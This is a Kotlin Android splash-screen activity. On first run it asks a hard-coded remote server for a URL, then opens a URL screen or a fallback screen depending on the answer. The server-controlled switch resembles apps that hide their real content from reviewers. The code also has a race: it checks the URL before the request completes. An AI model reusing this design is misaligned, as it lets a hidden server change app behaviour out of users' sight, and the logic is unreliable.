package test.zadanie.com

import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.util.Log
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import com.github.kittinunf.fuel.httpGet
import com.google.gson.Gson


class SplashScreenActivity : AppCompatActivity() {


    private val SPLASH_TIME_OUT:Long = 3000 // 1 sec
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash_screen)

        val pref = Prefs(applicationContext)
        val gson = Gson()
        val main = Func()

        Handler().postDelayed({

            if (main.checkForInternet(this)) {

                if (pref.getBoolean("firstRun")) {
                    "https://sporter1.ru/aka.php?id=2gy3oyj4vsvzmo484hxp".httpGet().responseString()
                    { _, _, result ->
                        val info:Info=gson.fromJson(result.toString(), Info::class.java)
                        Log.i("APIResponse", info.url.toString())
                        pref.setString("URL", info.url.toString())
                    }
                    pref.setBoolean("firstRun", false)
                }

                if(pref.getString("URL") != "null"){
                    startActivity(Intent(this, URLActivity::class.java))
                    finish()
                }
                else{
                    startActivity(Intent(this, NoURLActivity::class.java))
                    finish()
                }

            } else {
                main.onAlertDialog(View(this))
            }

        }, SPLASH_TIME_OUT)
    }
}